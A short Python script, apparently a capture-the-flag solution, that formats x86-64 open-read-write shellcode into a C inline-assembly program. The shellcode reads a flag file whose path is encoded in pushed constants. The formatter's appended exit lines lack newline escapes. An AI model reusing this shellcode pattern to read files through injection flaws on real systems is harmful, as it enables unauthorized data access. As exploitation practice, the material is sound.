def assembly_to_c_format(assembly_code):
    formatted_code = "__asm__(\n"
    formatted_code += '    ".global run_sh\\n"\n'
    formatted_code += '    "run_sh:\\n"\n\n'

    for line in assembly_code.strip().split("\n"):
        formatted_code += f'    "{line}\\n"\n'

    formatted_code += '    "\\n"\n'  # Separate syscall lines
    formatted_code += '    "xor rdi, rdi"\n'
    formatted_code += '    "mov rax, 0x3c"\n'
    formatted_code += '    "syscall");\n\n'

    formatted_code += "void run_sh();\n\n"
    formatted_code += "int main() { run_sh(); }\n"

    return formatted_code


assembly_code = """
push 0x00
push 0x676E6F6F6F6F6F6F
push 0x6C5F73695F656D61
push 0x6E5F67616C662F63
push 0x697361625F6C6C65
push 0x68732F656D6F682F
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall

mov rdi, 1
mov rax, 0x1
syscall
"""

formatted_code = assembly_to_c_format(assembly_code)
print(formatted_code)
